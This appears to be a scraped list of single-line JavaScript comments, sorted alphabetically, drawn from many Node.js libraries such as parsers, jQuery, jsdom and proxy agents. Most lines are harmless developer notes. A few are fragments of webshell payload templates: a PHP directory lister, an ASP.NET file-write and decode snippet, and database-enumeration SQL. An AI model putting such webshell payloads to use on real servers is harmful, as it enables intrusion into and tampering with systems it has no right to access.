"// No need to pop anything from newPath.stack or oldPath.stack, since"
"// No special behavior since these rules fall back to ""in body"" mode for"
"// No wildcards, so stop proxying if there is an exact match."
"// Node v6 didn't export this, so we just hard code the version and rely"
"// Node with only one child (on the left), causes rebalancing"
"// Node, which happens to be the same as path.parent.node:"
"// Node. Does not work with strict CommonJS, but"
"// Node. Instead, path.parentPath.node refers to the closest ancestor"
"// Node.js LazyTransform implementation, which has a non-trivial getter for"
"// Nodes with decorators can't have parentheses, so we can avoid"
"// Non-direct chars are encoded as ""+<base64>-""; single ""+"" char is encoded as ""+-""."
"// Non-existent attributes return null, we normalize to undefined"
"// Normal character, just use it."
"// Normalize """", auto, and prepare for extra"
"// Normalize opt.queue - true/undefined/null -> ""fx"""
"// Normally we'd insert a comment node, but since this is a situation"
"// Normally you'd read this from the filesystem, but I'll just use a string here"
"// Not ""accessibility""?"
"// Not a dir entry, have to remove it."
"// Not completely spec compliant due to e.g. incomplete implementations of disabled for form controls, or no"
"// Not listening for removeListener, no need to emit"
"// Not public - generate a queueHooks object, or return the current one"
"// Not quite $.extend, this won't overwrite existing keys."
"// Not supported by iconv, not sure why."
"// Not that to set fields in subdocuments, you HAVE to use dot-notation"
"// Note that ""x.x"" is a valid xRange identifer, meaning ""any version"""
"// Note that 'yield' is treated as a keyword in strict mode, but a"
"// Note that ParentNode is a ""NoInterfaceObject"""
"// Note that for maximum portability, libraries that are not jQuery should"
"// Note that for-in statements are left unmodified, as they do not have a"
"// Note that on windows, we always drop the entire cache whenever a"
"// Note that since a copy is used, `search`'s `lastIndex` isn't updated *during* replacement iterations"
"// Note that the _id is kept unchanged, and the document has been replaced"
"// Note that the only major, minor, patch, and pre-release sections of"
"// Note that the visitor object is the prototype of Context.prototype,"
"// Note that these all use the loose form, because they'll be"
"// Note that this may be asynchronous, or synchronous.  Yes, it is"
"// Note that this will throw on failure, which will fail the test."
"// Note that undefined fields will be visited too, according to"
"// Note that windows will think that //x/y/z/a has a ""root"" of //x/y, and in"
"// Note: 0 is a valid value, means ""don't call _read preemptively ever"""
"// Note: 0 is a valid value, means that we always return false if"
"// Note: As of Tor v0.3.5.7+, if user/pass auth is an option from the client, by default it will always take priority."
"// Note: The comments on the `throw` lines are intentional, they show"
"// Note: This function is called only from parseObjectProperty(), where"
"// Note: We do not allow listening to mouseOver events. Instead, use the"
"// Note: button is not normalized, so don't use it"
"// Note: difference from C - smlen returned, not passed as argument."
"// Note: esprima can't actually parse ""for each (""."
"// Note: not polyfilled with safer-buffer on a purpose, as overrides Buffer"
"// Note: you can't use nested comparison functions, e.g. { $size: { $lt: 5 } } will throw an error"
"// Nothing to do, no data corruption possible in the brower"
"// Nothing to do, no directories will be used on the browser"
"// Now do some stuff that might rearrange the list, and this replacement"
"// Now the fruits array is ['apple', 'orange', 'pear', 'banana', 'orange']"
"// Now the fruits array is ['apple', 'orange', 'pear', 'banana']"
"// Now the fruits array is ['apple', 'orange']"
"// Now the fruits array is ['orange', 'pear']"
"// Now, the file has been compacted and is only 1 line long"
"// OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF"
"// OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE"
"// Object type used to represent tokens. Note that normally, tokens"
"// Objects with different constructors are not equivalent, but `Object`s"
"// Old API was `parse([argv, [slice]])`"
"// Older IE sometimes signals ""interactive"" too soon"
"// Oldest GB2312 (1981, ~7600 chars) is a subset of CP936"
"// Omits script parameter and any check for muted errors; takes error object, message, and location as params, unlike"
"// Omitting unneeded parts with null valueNames, and using escapeChar"
"// On a manual native abort, IE9 throws"
"// On some platforms, in particular some releases of Android 4.x,"
"// On the selectionchange event, the target is just document which isn't"
"// On windows, thanks to the magic of 8.3 shortnames, it is fundamentally"
"// Once again, Sass deviates from the spec and supplies the version as a"
"// Only 2 items were set using localForage,"
"// Only String really seems appropriate here, since BigInt values"
"// Only add window if we got to document (e.g., not plain obj or detached DOM)"
"// Only placeholder, since it will be rescanned as a real assignment expression."
"// Only use tocbot for main docs, not test docs"
"// Opera 10.63+ [xxx = 0, xXx = 2]"
"// Optimization, not in the spec."
"// Optimize for push.apply( _, NodeList )"
"// Optional AJAX dependency, but won't run scripts if not present"
"// Optional dependency (as in, doesn't need to be installed, NOT like optionalDependencies in package.json)"
"// Or specify/override options when you instantiate, if you prefer:"
"// Or use `pfx` property replacing `cert` and `key` when using private key, certificate and CA certs in PFX or PKCS12 format:"
"// Or, with named functions:"
"// Original file position, but no source."
"// Other errors are warnings, which raise the error in strict"
"// Otherwise (e.g. `<input type=""text"">`, return only one key/value pair"
"// Otherwise bring back whatever was previously saved (if anything),"
"// Otherwise err on the side of overparenthesization, adding"
"// Otherwise people can pipe Writable streams, which is just wrong."
"// Otherwise secure it in a non-enumerable, non-writable property"
"// Otherwise stream chunks are all considered to be of length=1, and the"
"// Otherwise, ask the cursor to skip ahead n"
"// Otherwise, avoid the DOM node creation, insertion"
"// Otherwise, build a param string"
"// Otherwise, create an array by matching non-whitespace"
"// Otherwise, do not use tunnel."
"// Otherwise, do nothing"
"// Otherwise, double quotes are used."
"// Otherwise, if a way to get the computed value exists, use that"
"// Otherwise, insert the intermediate dataType"
"// Otherwise, redefine all properties (slow!)"
"// Otherwise, set the pointerBeforeReferenceNode attribute to false."
"// Otherwise, simply generate a flat `switch` statement."
"// Otherwise, this object is spent"
"// Otherwise, this returns the code unit of the index (can be a part of a surrogate pair)."
"// Otherwise, throw an Invalid Package Target error."
"// Otherwise, throw an error or return tokens"
"// Otherwise, use our decoding method."
"// Otherwise, use our encoding method."
"// Otherwise, we return either a specified config value or all"
"// Our codec supports UTF-16 surrogates, extensions for GB18030 and unicode sequences."
"// Out: [1, 2, 3]"
"// Out: x = {""class"": 2};"
"// Out: x[""class""] = 3;"
"// Output: a string that contains all alphabetic letters, high-byte characters, and word immediately preceding `>`, but nothing else within `<>`"
"// Override this option to use a different line terminator, e.g. \r\n."
"// Own properties are enumerated firstly, so to speed up,"
"// Owner will be preserved, unless ref is overridden"
"// P:String=System.Text.Encoding.GetEncoding(""!{ANT::ENDOCE}"").GetString(System.C"
"// PACKAGE_EXPORTS_RESOLVE(packageURL, subpath, exports, conditions)"
"// PACKAGE_IMPORTS_EXPORTS_RESOLVE(matchKey, matchObj, packageURL, isImports, conditions)"
"// PACKAGE_IMPORTS_RESOLVE(specifier, parentURL, conditions)"
"// PACKAGE_RESOLVE(packageSpecifier, parentURL)"
"// PACKAGE_TARGET_RESOLVE(packageURL, target, subpath, pattern, internal, conditions)"
"// PATTERN_KEY_COMPARE(keyA, keyB)"
"// Pack sign, exponent, fraction"
"// Padding ""String"""
"// Parse a `for`/`in` and `for`/`of` loop, which are almost"
"// Parse a program. Initializes the parser, reads any number of"
"// Parse a regular expression. Some context-awareness is necessary,"
"// Parse a semicolon-enclosed block of statements, handling `""use"
"// Parse call, dot, and `[]`-subscript expressions."
"// Parse headers and setup the parser, ready to start listening for data."
"// Parse the code using an interface similar to require(""esprima"").parse."
"// Parse unary operators, both prefix and postfix."
"// Parsers aren't required to observe error event,"
"// Parses a comma-separated list of expressions, and returns them as"
"// Part of an app, that fetches cats of the logged user."
"// Pass a string as options.sourceMapName to recast.print, and"
"// Pass bytes on through for single-byte encodings (e.g. ascii, latin1, hex)"
"// Pass optional meta-data with an 'options' object with style: {value: DATA, options: OPTIONS}"
"// Passed in values `a`, `b`, `c`"
"// Passed in values `x`, `z`"
"// Passing a regex object to copy it. The copy maintains special properties for named capture,"
"// Patch fs.close/closeSync to shared queue version, because we need"
"// Path Not Found Or No Permission!"");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.$N;$T=@date(""Y-m-d H:i:s"",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=""\\t"".$T.""\\t"".@filesize($P).""\\t"".$E.""\\n"";if(@is_dir($P))$M.=$N.""/"".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}`,"
"// Path Not Found Or No Permission!"");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.$N;$T=@date(""Y-m-d H:i:s"",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=""\t"".$T.""\t"".@filesize($P).""\t"".$E.""\n"";if(@is_dir($P))$M.=$N.""/"".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}`,"
"// Path not found OR no Permission"";`"
"// People use this property instead all the time, so support it"
"// Per 4.2.1.2, Bump clockseq on clock regression"
"// Per 4.2.1.2, use count of uuid's generated during the current clock"
"// Per 4.2.2, randomize (14 bit) clockseq"
"// Per 4.4, set bits for version and `clock_seq_hi_and_reserved`"
"// Per 4.5, create and 48-bit node id, (47 random bits + multicast bit = 1)"
"// Person {name: 'Laura', age: 25}"
"// Plus sign, followed by one or more period-separated build metadata"
"// Pop the previous token, '/' or '/='"
"// Pop the previous token, which is likely '/' or '/='"
"// Populate the exported fields of the namedTypes namespace, while still"
"// Pre-defined namespaces, per Appendix C"
"// Precompiled matchers will still verify ancestry, so step up a level"
"// Prefer `hostname` over `host`, and set the `port` if needed."
"// Prefer `hostname` over `host`, because of `url.parse()`"
"// Prefilter to get matcher input, preserving a map for seed-results synchronization"
"// Preparing all the $in arrays, will take some time"
"// Prevent attribute/property ""interpolation"""
"// Prevent re-triggering of the same event, since we already bubbled it above"
"// Previously, `originalEvent: {}` was set here, so stopPropagation call"
"// Primitives and their corresponding object wrappers are equivalent; thus, `""5""` is"
"// Print the root node generically, but then resume reprinting its"
"// Probably in the ""in body"" parsing mode, so we outlaw only tag combos"
"// Processed fragments are removed from this array, by calling `shiftNextLine`."
"// Prop type validation may throw. In case they do, we don't want to"
"// Property, then the location information stored in"
"// Proposed for ES6, included in AS3"
"// Proposed for ES6, included in Firefox 3+"
"// Proxy version (4 or 5). For v4a use 4, for v5h use 5."
"// Put this here so that it is enumerable, and looks like a property."
"// Putting it all together, we can follow the chain of object references"
"// QSAPI buggy in quirks mode, match count is:"
"// Quick check to determine if target is callable, in the spec"
"// Quietly expect a comma when in tolerant mode, otherwise delegates to expect()."
"// Quite fast and speed doesn't change with database size (tested with N=10000 and N=50000, still no slow-down)"
"// RFC6265 S4.1.1 defines path value as 'any CHAR except CTLs or "";""'"
"// Random number generator - requires a PRNG backend, e.g. prng4.js"
"// ReactClasses doesn't have constructors. Instead, they use the"
"// Read a single token, updating the parser object's token-related"
"// Read a string value, interpreting backslash-escapes."
"// Read an identifier, and return it as a string. Sets `containsEsc`"
"// Read an identifier, and return it as a string. Sets `this.containsEsc`"
"// Read an integer, octal integer, or floating-point number."
"// Read the specified attribute from the equivalent HTML5 `data-*` attribute,"
"// Reads a template token to search for the end, without validating any escape sequences"
"// Recursively close child frame windows, then ourselves."
"// Regex search, using named backreferences in replacement function"
"// Regex search, using named backreferences in replacement string"
"// Regex to split a filename into [*, dir, basename, ext]"
"// Register as a named AMD module, since jQuery can be concatenated with other"
"// Reload database without a crash, check that no data was lost and fs state is clean (no temp file)"
"// Remember the old values, and insert the new ones"
"// Remove `allowExpressionBody` for 7.0.0, as it is only called with false"
"// Remove all keys from the datastore, effectively destroying all data in"
"// Remove an item from the store, nice and simple."
"// Remove parameters from the previous response, unless this is the second request"
"// Remove the prefix from the key, if a key is found."
"// Remove trailing 'c's. Equivalent to str.replace(/c*$/, '')."
"// Removed to create an eval-free library"", from: node.start, to: node.end})"
"// Removing the function wrapper causes a ""Permission Denied"""
"// Replay the ""buffered"" Buffer onto the fake `socket`, since at"
"// Requires ec.js, jsbn.js, and jsbn2.js"
"// Requires lodash (or underscore), express3 and dresende's orm2."
"// Resolve when we played the last frame; otherwise, reject"
"// Return a regular expression object for this pattern-flag pair, or"
"// Returns a function that is the composition of a list of functions, each"
"// Returns a function that will be executed at most one time, no matter how"
"// Returns a function, that, as long as it continues to be invoked, will not"
"// Returns a function, that, when invoked, will only be triggered at most once"
"// Returns a type that matches the given value iff any of type1, type2,"
"// Returns class name of the object, if any."
"// Returns the first function passed as an argument to the second,"
"// Returns true if a and b are considered the same, false otherwise"
"// Reusing 'index' because we have the correct ""name"""
"// Rhino's regular expression parser is flaky and throws uncatchable exceptions,"
"// Rhino, and plain browser loading."
"// Right is not too small, don't change"
"// Roll back to checkpoint, handle error (which may add items to the transaction), and take a new checkpoint"
"// Root has only one child, on the left"
"// Root has only one child, on the right"
"// Round down to include only full blocks,"
"// Round x to the nearest integer, choosing the even integer if it lies halfway between two."
"// Run Underscore.js in *noConflict* mode, returning the `_` variable to its"
"// Run jsdom hooks; roughly correspond to spec's ""An attribute is removed."""
"// Run jsdom hooks; roughly correspond to spec's ""An attribute is set and an attribute is added."""
"// Run jsdom hooks; roughly correspond to spec's ""An attribute is set and an attribute is changed."""
"// S5.2.3 ""Let cookie-domain be the attribute-value without the leading %x2E"
"// S5.2.3 ""unparsed-attributes consist of the remainder of the set-cookie-string"
"// S5.3 says to give the ""latest representable date"" for which we use Infinity"
"// S5.3 step 11 - ""If the cookie store contains a cookie with the same name,"
"// SAXParser is the Transform stream, which means you can pipe"
"// SBCharSetProber does, to recognize windows-1255, upon which this model was"
"// SELECT * FROM (SELECT A.*,ROWNUM N FROM table2 A ORDER BY 1) WHERE N>0 AND"
"// SPEC: says to use ""get the base"" algorithm,"
"// Sadly, the best way to save binary data in WebSQL/localStorage is serializing"
"// Safari 3.2 QSA doesn't work with mixedcase in quirksmode [xxx = 1, xXx = 0]"
"// Safely convert anything iterable into a real, live array."
"// Same as Name productions but removing the "":"" from NCNameStartChar"
"// Same as above, but punycoded."
"// Same as localStorage's key() method, except takes a callback."
"// Same as subtractPos(start, start.line, start.column):"
"// Same name, but different storeName since this has been"
"// Sass 3.3 leaves out the 'names' array, so we deviate from the spec (which"
"// Save the original host before any redirect (if it changes, we need to"
"// Search, expanding context for leading sibling combinators"
"// See ""LICENSE"" for details."
"// See ""Option specs"" below for types."
"// See #1064, #1293"
"// See also below a UTF-7-IMAP codec, according to http://tools.ietf.org/html/rfc3501#section-5.1.3"
"// See rules for 'li', 'dd', 'dt' start tags in"
"// See: Parsing of ""textarea"" ""listing"" and ""pre"" elements"
"// Sent auth request for Socks v5, waiting for response."
"// Sent final Socks v5 handshake, waiting for final response."
"// Sent initial handshake, waiting for response."
"// Serialize a value, afterwards executing a callback (which usually"
"// Set doc's content type to ""text/html""."
"// Set position first, in-case top/left are set even on static elem"
"// Set the Accepts header for the server, depending on the dataType"
"// Set the If-Modified-Since and/or If-None-Match header, if in ifModified mode."
"// Set the correct header, if data is being sent"
"// Set the guid of unique handler to the same of original handler, so it can be removed"
"// Set the referenceNode attribute to the last inclusive descendant in tree order of oldPreviousSibling,"
"// Set the text content of the first node after the opening comment, and"
"// Set the timeout this long because some Windows Anti-Virus, such as Parity"
"// Set to `true` if the timeout was a connection timeout, `false` or"
"// Sets to ascii encoding, 1024 length internal buffer."
"// Sets to ascii encoding, 4096 length internal buffer."
"// Setup callback first, so we don't miss anything from data events emitted"
"// Shift rows, sub bytes, add round key"
"// Shift rows, sub bytes, mix columns, add round key"
"// Shorthand property that IE8 won't like unsetting, so unset each"
"// Should be alphanumeric, with underscores."
"// Should return 1, but returns 4 (following)"
"// Shouldn't get here (the parser shouldn't let us know about invalid doctypes), but our logic likely isn't"
"// Similar to FastPath.prototype.call, except that the value obtained by"
"// Similar to FastPath.prototype.each, except that the results of the"
"// Similar to doing node.body.body.unshift(restVarDecl), except"
"// Similar to eachField, except that iteration stops as soon as the"
"// Simple values such as ""10px"" are parsed to Float;"
"// Since JS doesn't have multiple prototypal inheritance, this class"
"// Since Lines objects are immutable, we can reuse any source map"
"// Since TypeScript is parsed by Babylon, include the core Babylon types"
"// Since `method` didn't throw, we don't want to silence the exception"
"// Since aNameCount !== bNameCount, we need to find some name that's"
"// Since each subkey is applied to an expanded 32-bit input,"
"// Since elements are immutable after the owner is rendered,"
"// Since it's just a struct in RAM, this Store is synchronous"
"// Since mappings are sorted, this is guaranteed to find all mappings for"
"// Since previous versions didn't check for Content-Encoding header,"
"// Since the ""set"" path can have two possible entry points"
"// Since the name is always a string, null is a safe sentinel value to"
"// Since the query object isn't implemented, call updateSteps manually for now"
"// Since there is no way to tell _how_ a key was added, remove"
"// Since this key hasn't been set yet, we'll get a null value"
"// Since this.Context.prototype === this, there's a chance we"
"// Size of database, in bytes. WebSQL-only for now."
"// Skip over a trailing comma, if any"
"// Skip semicolon, if any."
"// Slow and gets slower really fast with database size, then outright crashes"
"// Slow case, write chunks one-by-one"
"// Slow, I know, but we don't have a better way yet."
"// So if comment is attached to target node, we should specialize."
"// So if there are non-reserved chars (and it's not already all % encoded), just encode them all"
"// So we know the leaves are 3, 8, 12, 37"
"// So, if this is awaiting a drain, then we just call it now."
"// So, we allow :focus to pass through QSA all the time to avoid the IE error"
"// So, we count ASCII as if it was LE or BE, and decide from that."
"// So, we just pretend that every path matches every other path here,"
"// So, we know that it won't be ENOENT or ENOTDIR or anything else."
"// Socks v5 has two handshakes, handle initial one here."
"// Solution would be installing npm modules ""buffer"" and ""stream"" explicitly."
"// Some AMD build optimizers, like r.js, check for condition patterns like:"
"// Some AMD build optimizers, like r.js, check for specific condition patterns"
"// Some chars can be decoded, but need not be encoded."
"// Some inserts in sequence, using the default storage mechanism (IndexedDB in my case)"
"// Some non-html elements return undefined for offsetWidth, so check for null/undefined"
"// Some non-printable keys are reported in `charCode`/`keyCode`, discard them."
"// Some of these tests are not known to fail in any browser, but many fail in at least one"
"// Some source maps produce relative source paths like ""./foo.js"" instead of"
"// Some styles come back with percentage values, even though they shouldn't"
"// Something caused path.name to become out of date, so attempt to"
"// Something else than http_proxy / https, as a sanity check."
"// Something like ""2.*"" or ""1.2.x""."
"// Source type (""script"" or ""module"") for different semantics"
"// Spec says something about storing a list of markers, but it sounds"
"// Special case for text components, which return [open, close] comments"
"// Start an AST node, attaching a start offset."
"// Start with offset property, which is equivalent to the border-box value"
"// State is ""done"" now"
"// Statement, and ScopeBody, which denote categories of nodes."
"// Statement, which denote categories of nodes."
"// Step up the descendants, stopping when the root element is reached"
"// Steps 1-5, 7-10"
"// Still no good, back to final letter distance, maybe it'll save the day."
"// Stop when we get a match that ends at the string end, since no"
"// Storage for known flags, including addon flags"
"// Store native methods to use and restore (""native"" is an ES3 reserved keyword)"
"// Store state if its toggle - enables .stop().toggle() to ""reverse"""
"// Stores may be synchronous, but are still required to use a"
"// Strictly speaking, seeing an <option> doesn't mean we're in a <select>"
"// String, write as-is."
"// Strings, booleans, numbers, null"
"// Strings, numbers, dates, and booleans are compared by value."
"// Strip the ""pac+"" prefix"
"// Strip the last path component, but keep the ""/""."
"// Strip this value out when the encoding is set to 'utf8', as upstream consumers won't expect it and it breaks JSON.parse()."
"// Supply a list of drivers, in order of preference."
"// Support (at least): Chrome, IE9"
"// Support a empty string ""group"" to have a blank line between"
"// Support both (string, offset, length, encoding)"
"// Support { someField: FieldType, ... } syntax."
"// Support: Android 4.0-4.3, Safari<=5.1"
"// Support: Android<4.0, iOS<6 (functionish RegExp)"
"// Support: Android<4.1, PhantomJS<2"
"// Support: Chrome<29, Android<4.4, Safari<7.0+, iOS<7.0+, PhantomJS<1.9.8+"
"// Support: Firefox<29, Android 2.3"
"// Support: IE 10-11, Edge 10240+"
"// Support: IE 9-11, Edge"
"// Support: IE <=8 only, Android 4.0 - 4.3 only, Firefox <=3 - 37"
"// Support: IE, Opera, Webkit"
"// Support: IE8, Opera 11-12.16"
"// Support: IE<9, Safari"
"// Support: IE<=11+, Firefox<=30+ (#15098, #14150)"
"// Support: Safari 6.0+, Chrome<28"
"// Support: Safari 8+, iOS 8+"
"// Support: Safari<7-8+, Chrome<37-44+"
"// Support: Safari<=5.1, Android<4.2"
"// Support: iOS<=5.1, Android<=4.2+"
"// Symbol and BigInt do have Symbol.toStringTag by spec, so that can't be used to eliminate false positives"
"// System.IO.FileStream(P,System.IO.FileMode.Create);fs.Write(B,0,B.Length);fs.Cl"
"// TODO Events: use constructor directly, once they are no longer tied to a window."
"// TODO Move a non-caching implementation of this function into ast-types,"
"// TODO Not in the Mozilla Parser API, but used by Esprima."
"// TODO exclude <input type=""image"">"
"// TODO should be on Node, not here"
"// TODO should be on prototype, not here"
"// TODO: Add tests (basic functionality tests, not the long list from"
"// TODO: Distinguish by namespace here -- for <title>, including it here"
"// TODO: IBM CCSID 942 = CP932, but F0-F9 custom chars and other char changes."
"// TODO: If nothing has changed, return the prevChildren object so that we"
"// TODO: This is really a ReactText (ReactNode), not a ReactElement"
"// TODO: This should probably be a class, not functionally"
"// TODO: abort if the content-type is not text/css, and the document is"
"// TODO: defer error events consistently everywhere, not just the cb"
"// TODO: don't generate '/' nodes, just Axis nodes."
"// TODO: don't use this._ownerDocument; instead, create a new document"
"// TODO: eventually we should re-write the element-builder system to be namespace aware, but for now it is not."
"// TODO: not really needed, but supposedly tokenizer also disambiguates"
"// TODO: remove this once we no longer rely on mutation events internally, since they are nonstandard"
"// TODO: should this be '(""foo\\nbar""\r\n)' to maintain the number of lines"
"// TODO: when we move nodeType to Node.prototype and add an internal _nodeType, consult that instead."
"// TTL() partially replaces the ""expiry-time"" parts of S5.3 step 3 (setCookie()"
"// TVMLKit (Apple TV JS Runtime) does not have a window object, just localStorage in the global context"
"// Tab, Return, Esc, Space"
"// Table is empty."").""\\t|\\t\\r\\n"");"
"// Take a JSON payload {str: ""some string""} and convert it to hex"
"// Take note if the _read call is sync or async (ie, if the read call"
"// Target should not be a text node (#504, #13143)"
"// Technically it could also mean the write was successful but the rename wasn't, but there is in any case no guarantee that the data in the temp file is whole so we have to discard the whole file"
"// Technically, this is a transform stream that you write paths into,"
"// Test _writableState for inheritance to account for Duplex streams,"
"// Test default display if display is currently ""none"""
"// Test that even if a callback throws an exception, the next DB operations will still be executed"
"// Test whether a statement node is the string literal `""use strict""`."
"// Tests the tree structure (deletions concern the whole tree, deletion of some data in a node is well tested above)"
"// Text/cdata nodes can get big, and since they're buffered,"
"// That is why we assign everything inside of the constructor, instead of using a shared prototype."
"// The .comments field of the Node type is hidden, so we only"
"// The Mozilla Parser API gives this type as [or(def(""Expression""),"
"// The Parser API calls this ArrowExpression, but Esprima and all other"
"// The UTF8 BOM [0xEF,0xBB,0xBF] is converted to [0xFE,0xFF] in the JS UTC16/UCS2 representation."
"// The WHATWG specifies that when ""textContent"" changes, the ""raw value"""
"// The `add()` method is like `write()` but returns this,"
"// The array here would be [ 1, 2, 3 ];"
"// The assignment of fine-grained, information-carrying type objects"
"// The broken getElementById methods don't pick up programatically-set names,"
"// The buffer we got is byte oriented, and a character may span in more than one"
"// The chain order is the order in the proxies array, meaning the last proxy will establish a connection to the destination."
"// The child process will load the database with the given datafile, but the fs.writeFile function"
"// The client seems to want a copy of this Lines object, but"
"// The cornerstone, an `each` implementation, aka `forEach`."
"// The correct way to do this is lazy, and a bit more complicated; see"
"// The current spec forbids arrow generators, so I have taken the"
"// The dependencies here are a bit screwy; when we get a chance to move all events to living, things will get simpler."
"// The doc #3 has been replaced by { _id: 'id3', planet: 'Pluton' }"
"// The enclosing node has no child nodes at all, so what we"
"// The exception is when deep is true; then, we recursively check all"
"// The final ""%c"" is somewhat tricky, because there could be other"
"// The first buffer is always `handle._outBuffer`, which would be"
"// The following Regular Expressions can be used for tokenizing,"
"// The goal symbol for the parse is |Pattern[~U, ~N]|. If the result of"
"// The handler code probably refers to functions declared globally on the window, so we need to run it in"
"// The identifier C does not have to be a valid language name."""
"// The length of the stack can be either even or odd, depending on whether"
"// The nodes have different types, and at least one of the types"
"// The offset fields are 0-based, but we use 1-based indices when"
"// The parsing of types roughly parallels the parsing of expressions, and"
"// The primary purpose of this method is to ""tap into"" a method chain, in"
"// The proxy is connecting to a TLS server, so upgrade"
"// The real hasFeature is in living/dom-implementation.js, and returns true always."
"// The remote host to have the proxy send data to, or the remote host that send this data."
"// The returnType is not wrapped in a TypeAnnotation, so the colon"
"// The right-associative version of reduce, also known as `foldr`."
"// The same code, but using ES6 Promises."
"// The sourceURL gets injected into the source that's eval-ed, so be careful"
"// The special _id index is managed by datastore.js, the others need to be persisted"
"// The test attribute must be unknown in Opera but ""safe"" for WinRT"
"// The two last characters seen in the previous buffer,"
"// The value encapsulated by this Path, generally equal to"
"// Then, we should write first char of the sequence as-is and try the rest recursively."
"// There *must* be a type, no attaching namespace-only handlers"
"// There are a number of idiomatic ways of expressing types, so this"
"// There are so many media events, it makes sense to just"
"// There are still more digits in this value, so we must make sure the"
"// There can only be one selection per document in IE, so it must"
"// There's already a sequence, set a single-char subsequence of it."
"// There's nothing wrong with doing node.rest = null, but I wanted"
"// Therefore, to pass our cookie jar to the request, we need to create"
"// Therefore, we will just skip decoding for such URIs."
"// These are the percent-encoded utf-8 octets representing a checkmark, indicating that the request actually is utf-8 encoded."
"// These are used when `options.locations` is on, for the"
"// These aren't actually used by `agent-base`, but are required"
"// These hold the ""current"" state"
"// These nest, from the most general expression type at the top to"
"// These node references were useful for breaking ties, but we"
"// These objects are considered obsolete by CSSOM draft, although modern"
"// These rules don't really make sense to implement, so CSSOM draft makes them"
"// These should be set up in the constructor, but as a convenience for"
"// They are not expected to be perfectly to-spec, and PRs to improve them over time are certainly appreciated."
"// This ""if"" is needed for plain objects"
"// This PR has caused many people issues, but supporting it seems like a"
"// This approach works across all browsers, whereas `change` does not fire"
"// This could be a non-native DOM implementation,"
"// This function is designed to be inlinable, so please take care when making"
"// This implementation works on strings, a single character at a time"
"// This implements window.frames.length, since window.frames returns a"
"// This indexOf lookup may be O(n), but the typical number of base"
"// This is CommonJS because lie is an external dependency, so Rollup"
"// This is a buffering parser, not quite as nice as the multipart one."
"// This is a constant value which varies from language to language, used in calculating confidence.  See http://www.mozilla.org/projects/intl/UniversalCharsetDetection.html for further detail."
"// This is a function and not an arrow function, since the original is also a function"
"// This is a tag to indicate that the use of these method names is ok,"
"// This is a trick taken from Esprima. It turns out that, on"
"// This is also our approach for IE handling, for the reason above."
"// This is broken in Safari (tested v5.1.2/7534.52.7), but not for any fault of XRegExp."
"// This is broken in old Firefox (tested v2.0; it works in v8+), but not for any fault of XRegExp."
"// This is called when the auth response is received. The received packet is passed in as a Buffer, and you must return a boolean indicating the response from the server said your custom auth was successful or failed."
"// This is faster than the test case (and it's sync), so we just"
"// This is hiragana 2-char sequence table, the number in each cell represents its frequency category"
"// This is nowhere near spec compliant, but has worked so far."
"// This is only to have a better contract semantic, i.e. another safety net"
"// This is really to solve DER cases, but whatever for now"
"// This is the behavior as of Mar 3, 2015."
"// This is the list of parsers, to modify them, use jsDump.setParser"
"// This is to work around cases where hwm=0, such as the repl."
"// This method will be called for any node with .type ""MemberExpression"":"
"// This only warns, because the request is still likely to work"
"// This queue will execute all commands, one-by-one in order"
"// This replaces the ""persistent-flag"" parts of S5.3 step 3"
"// This returns true if the highWaterMark has not been hit yet,"
"// This second call has no effect, documents don't get inserted twice in the index"
"// This seems not to work, and will produce"
"// This should match. Note that '\', '%' are invalid characters"
"// This shouldn't throw since ""$actuallyok"" is not a field name"
"// This slightly different solution has identical results, but is a lot less complex."
"// This still has an advantage over plain `auto`, since the results a task"
"// This test performs several inserts and deletes at random, always checking the content"
"// This thing manages the queue of requests, and returns"
"// This throws, because it can't send/receive data as expected"
"// This value does not have an outerHTML attribute,"
"// This value, if given, is stored in every node, whether"
"// This will be true for all values of exists except false, null, undefined and 0"
"// This will create an AVL tree with leaves 3, 8, 12, 37"
"// This will rename the database from ""localforage"""
"// This will throw later in _renderValidatedComponent, but add an early"
"// This will trigger an ""upgradeneeded"" event which is required"
"// Throw an error if a forbidden character was found in `variable`, to prevent"
"// Thus, it must be an identifier."
"// Thus, we need to skip adding a comment if the comment array already"
"// Timers currently will call their complete callbacks, which"
"// To avoid a cyclic dependency, we create the final class in this module"
"// To avoid recursion in the case that type == ""newListeners""! Before"
"// To avoid recursion in the case that type === ""newListener""! Before"
"// To be accurate, the length of class 6 can be either 2 or 4."
"// To demonstrate the call method, let's first create the function we'll be using..."
"// To make comparing ReactElements easier for testing purposes, we make"
"// To preserve inline typechecking directives, we"
"// To reduce the number of selectors needing tokenize in the preFilter, prefer arguments:"
"// To return the position we are searching for, we must first find the"
"// To save memory and loading time, we read table files only when requested."
"// ToString, which in our case amounts to calling String()."
"// Tokens become part of the regex construction process, so protect against infinite recursion"
"// Tolerate NodeList properties (IE: ""length""; Safari: <number>) matching elements by id"
"// Track the current IME composition fallback object, if any."
"// Track whether a listener exists for this plugin. If none exist, we do"
"// Transform a binary string to an array buffer, because otherwise"
"// Traverse the character tree, allocating new nodes as needed."
"// Treat null/undefined as """"; convert numbers to string"
"// Triggered event must either 1) have no namespace, or 2) have namespace(s)"
"// Trim trailing whitespace, if the end location is not already the"
"// Trivial, but provided for completeness."
"// Try again - we've informed the component about the error, so they can render an error message this time."
"// Try as many times as needed to get an unused _id. As explained in customUtils, the probability of this ever happening is extremely small, so this is O(1)"
"// Try to parse again, after skipping first byte of the sequence ('i' will be incremented by 'for' cycle)."
"// Try to skip some text, based on the error message, and then continue"
"// Tuples, or fixed length arrays with elements of different types:"
"// Type Annotations for Facebook Flow, typically stripped out or"
"// TypedArray subarray(long begin, optional long end);"
"// Typing rest params is awkward, so punting on that for now"
"// U+0061 LATIN SMALL LETTER A to U+007A LATIN SMALL LETTER Z"""
"// URI to a PAC proxy file to use (the ""pac+"" prefix is stripped)"
"// USE [database1];SELECT A.[name],B.[name] FROM syscolumns A,systypes B where"
"// UTF-16LE typically needs two bytes per character, but even if we have an even"
"// UTF-7 codec, according to https://tools.ietf.org/html/rfc2152"
"// UUID timestamps are 100 nano-second units since the Gregorian epoch,"
"// UglifyJS drops U+FEFF chars when parsing, so use String.fromCharCode"
